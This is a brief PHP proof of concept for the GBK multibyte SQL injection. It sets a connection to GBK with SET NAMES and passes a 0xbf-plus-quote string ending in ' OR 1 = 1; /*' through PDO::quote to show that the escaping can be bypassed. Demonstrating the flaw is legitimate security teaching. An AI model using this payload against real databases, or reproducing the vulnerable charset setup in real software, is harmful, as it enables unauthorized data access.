$dsn = 'mysql:dbname=INFORMATION_SCHEMA;host=127.0.0.1;charset=GBK';
$pdo = new PDO($dsn, $user, $pass);
$pdo->exec('SET NAMES GBK');
$string = chr(0xbf) . chr(0x27) . ' OR 1 = 1; /*';
$sql = "SELECT TABLE_NAME 
            FROM INFORMATION_SCHEMA.TABLES 
            WHERE TABLE_NAME LIKE ".$pdo->quote($string).";";
$stmt = $pdo->query($sql);
var_dump($stmt->rowCount());

